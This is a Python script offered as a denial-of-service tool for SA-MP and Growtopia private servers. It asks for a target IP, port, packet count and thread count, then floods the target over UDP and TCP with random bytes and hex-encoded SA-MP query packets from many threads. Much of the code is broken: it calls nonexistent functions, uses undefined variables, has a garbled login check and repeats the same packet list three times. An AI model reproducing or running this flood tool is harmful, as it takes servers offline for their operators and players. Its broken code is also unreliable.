#AUTHOR : PlanetsRocky999
#DEVELOPER : PlanetsRocky404
import random
import threading
import codecs
import struct
import time
import socket
import sys
import os

username=('PlanetsRocky404')
password=('MeteorRocky404')
UserWarning= "\033[96mKamu Salah Memasukan Password"
usernameget=input('\033[94m🛸Enter The Username🛸:')
passwordget=input('\033[94m🛸Enter The Password🛸: ')
print("\033[96mKamu Berhasil Memasukan Password")

os.system("clear")
print("\033[31mTOOLS DOS FOR SAMP | GTPS")
print("""\033[31m
█─▄─▄─█░█░██▄─█─▄██▀▄─██
███─███▄▄░███─▄▀███─▀─██
▀▀▄▄▄▀▀▀▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀""")
print("""
\033[0;36m                      
\033[0;36m               
\033[0;36m               
\033[0;36m               
\033[0;36m               
\033[0;36m               
\033[0;36m               
\033[0;36m               
\033[0;36m                
TOOLS PlanetsRocky404-PlanetsRocky404""")
print("\033[31m━━━ Enter The Ready Attack (y/n)")
choice = str(input("┗━>\033[0m:"))
print("[0] Loading.......")
time.sleep(1)
print("[25] Loading......")
time.sleep(1)
print("[69] Loading.......")
time.sleep(1)
print("[100] Loading.......")
time.sleep(1)
print("""
\033[0;31m                 ██████ ▓██   ██▓ ███▄    █ ▄▄▄█████▓ ▄▄▄     ▒██   ██▒
\033[0;32m               ▒██    ▒  ▒██  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▒████▄   ▒▒ █ █ ▒░
\033[0;33m               ░ ▓██▄     ▒██ ██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒██  ▀█▄ ░░  █   ░
\033[0;34m                 ▒   ██▒  ░ ▐██▓░▓██▒  ▐▌██▒░ ▓██▓ ░ ░██▄▄▄▄██ ░ █ █ ▒ 
\033[0;35m               ▒██████▒▒  ░ ██▒▓░▒██░   ▓██░  ▒██▒ ░  ▓█   ▓██▒██▒ ▒██▒
\033[0;36m               ▒ ▒▓▒ ▒ ░   ██▒▒▒ ░ ▒░   ▒ ▒   ▒ ░░    ▒▒   ▓▒█▒▒ ░ ░▓ ░
\033[0;37m               ░ ░▒  ░   ▓██ ░▒░ ░ ░░   ░ ▒░    ░      ░   ▒▒ ░░   ░▒ ░
\033[0;38m               ░  ░  ░   ▒ ▒ ░░     ░   ░ ░   ░ ░      ░   ▒   ░    ░  
\033[0;39m                     ░   ░ ░              ░                ░   ░    ░ 
""")

ip = str(input("\033[0;91mEnter The Target Ip: "))
port = int(input("\033[0;92mEnter The Target Port: "))
choice = str(input("\033[0;91mEnter The Ready Attack [Y] (y/n): "))
times = int(input("\033[0;92mEnter The Attack Packet: "))
threads = int(input("\033[0;91mEnter The Attack Threads:"))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ]
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ]
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                       ]
                       
def xxxxxxxxx():
  K_bytes = random._urandom(1150)
  K_bytes = random._range(1150)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sen(K_bytes,addr)
        print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
    except:
      print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))

def xxxxxxxx():
  K_bytes = random._urandom(5551)
  K_bytes = random._range(150)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sen(K_bytes,addr)
        print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
    except:
      print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))

def xxxxxxx():
  K_bytes = random._urandom(1027)
  K_bytes = random._range(150)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.send(K_bytes,addr)
        print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
    except:
      print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))

def xxxxxx():
  K_bytes = random._urandom(1311)
  K_bytes = random._range(150)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sen(K_bytes,addr)
        print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
    except:
      print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))

def xxxxx():
  K_bytes = random._urandom(11411)
  K_bytes = random._range(150)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(K_bytes,addr)
        print(i +" \032m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack By Fadil")

def xxxx():
  K_bytes = random._urandom(10291)
  K_bytes = random._range(150)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(K_bytes,addr)
        print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
    except:
      print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))

def xxx():
  K_bytes = random._urandom(1031)
  K_bytes = random._range(150)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sen(K_bytes,addr)
        print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
    except:
      print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))

def xx():
  K_bytes = random._urandom(1141)
  K_bytes = random._range(150)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(K_bytes)
      for x in range(times):
        s.send(K_bytes)
        print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
    except:
      s.close()
      print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))

def x():
  K_bytes = random._urandom(1121)
  K_bytes = random._range(150)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(K_bytes)
      for x in range(times):
        s.send(K_bytes)
        print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
    except:
      s.close()
      print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))

for y in range(threads):
  if usernameget==username:
      if passwordget==password:
          print('Succesfully')
      else:
          print('Password is Wrong')
  else:
    print('Username is Wrong')
    print('Username is Wrong')
    th = threading.Thread(target = xxxxxxxxx)
    th.start()
    th = threading.Thread(target = xxxxxxxx)
    th.start()
    th = threading.Thread(target = xxxxxxx)
    th.start()
    th = threading.Thread(target = xxxxxx)
    th.start()
    th = threading.Thread(target = xxxxx)
    th.start()
    th = threading.Thread(target = xxxx)
    th.start()
    th = threading.Thread(target = xxx)
    th.start()
else:
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()


def run():
	K_bytes = random._urandom(551)
	K_bytes = random._range(100)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(K_bytes,addr)
			print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
		except:
			print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))

def run2():
	K_bytes = random._urandom(551)
	K_bytes = random._range(100)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(K_bytes)
			for x in range(times):
				s.send(K_bytes)
			print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
		except:
			s.close()
			print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
            

def run3():
	K_bytes = random._urandom(551)
	K_bytes = random._range(100)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(K_bytes)
			for x in range(times):
				s.send(K_bytes)
			print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
		except:
			s.close()
			print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
            
  
def run4():
	K_bytes = random._urandom(551)
	K_bytes = random._range(100)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(K_bytes)
			for x in range(times):
				s.send(K_bytes)
			print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
		except:
			s.close()
			print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
			
def run5():
	K_bytes = random._urandom(551)
	K_bytes = random._range(100)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(K_bytes)
			for x in range(times):
				s.send(K_bytes)
			print(i +" \033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
		except:
			s.close()
			print("\033[93m=====> Attacking Server \033[91m%s \033[93mAnd Port \033[91m%s!!!"%(ip,port))
            
#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start()
		
